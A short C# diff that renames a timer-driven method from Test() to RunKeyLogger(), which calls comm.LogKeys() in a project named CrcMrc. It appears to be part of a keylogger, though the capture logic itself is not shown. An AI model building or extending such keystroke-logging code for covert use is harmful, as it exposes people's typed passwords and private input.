@@ -231,7 +231,7 @@ namespace CrcMrc
             KeyTime.Start();
         }
 
-        private void Test()
+        private void RunKeyLogger()
         {
             comm.LogKeys();
         }
@@ -301,7 +301,7 @@ namespace CrcMrc
 
         private void KeyTime_Tick(object sender, EventArgs e)
         {
-            Test();
+            RunKeyLogger();
         }
     }
 }
